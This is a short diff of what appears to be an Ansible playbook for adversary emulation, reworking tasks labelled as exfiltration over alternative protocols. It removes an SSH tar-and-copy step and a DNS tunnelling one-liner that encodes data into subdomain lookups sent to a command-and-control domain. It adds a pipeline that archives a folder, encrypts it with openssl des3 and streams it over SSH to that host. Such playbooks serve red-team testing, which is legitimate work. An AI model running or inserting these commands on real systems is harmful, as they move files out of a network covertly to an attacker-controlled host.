@@ -10,10 +10,5 @@
       register: exfil_check
     - name: Exfiltration Over Alternative Protocol - SSH
       shell: |
-        ssh {{ cnc_fqdn }} "(cd {{ exfiltration_folder }} && tar -zcvf - *) > ./{{ exfiltration_file }}.tar.gz"
-        tar -czpf {{ exfiltration_file }} {{ exfiltration_folder }}/* | openssl des3 -salt -k password
-      when: exfil_check.stat.exists
-    - name: Exfiltration Over Alternative Protocol - DNS
-      shell: |
-        (LINE=`{{ exfil_cmd1 }}`;domain={{ cnc_fqdn }};var=;while IFS= read -r -n 1 char;do var+=$(printf %02X "'${char:-$'\n'}'");done<<<$LINE;e=60;l=${#var};for((b=0;b<l;b+=60))do>&/dev/udp/$RANDOM.$b.${var:$b:$e}.$domain/53 0>&1;done;>&/dev/udp/$RANDOM.theend.$domain/53 0>&1)
+        tar czpf - {{ exfiltration_folder }}/* | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}.enc'
       when: exfil_check.stat.exists
